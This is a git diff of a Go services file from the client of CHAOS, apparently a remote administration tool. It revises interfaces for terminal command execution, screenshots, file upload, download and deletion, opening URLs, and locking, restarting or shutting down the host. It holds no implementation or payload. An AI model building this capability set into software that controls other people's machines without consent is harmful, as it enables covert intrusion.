@@ -3,7 +3,6 @@ package services
 import (
 	"errors"
 	"github.com/tiagorlampert/CHAOS/client/app/entities"
-	"time"
 )
 
 var (
@@ -17,8 +16,10 @@ type Services struct {
 	Screenshot
 	Download
 	Upload
+	Delete
 	Explorer
 	OS
+	Url
 }
 
 type Information interface {
@@ -26,7 +27,7 @@ type Information interface {
 }
 
 type Terminal interface {
-	Run(cmd string, timeout time.Duration) string
+	Run(command string) ([]byte, error)
 }
 
 type Screenshot interface {
@@ -34,7 +35,11 @@ type Screenshot interface {
 }
 
 type Upload interface {
-	UploadFile(path string, uri string, paramName string) ([]byte, error)
+	UploadFile(path string) ([]byte, error)
+}
+
+type Delete interface {
+	DeleteFile(filepath string) error
 }
 
 type Download interface {
@@ -48,4 +53,10 @@ type Explorer interface {
 type OS interface {
 	Restart() error
 	Shutdown() error
+	Lock() error
+	SignOut() error
+}
+
+type Url interface {
+	OpenUrl(url string) error
 }
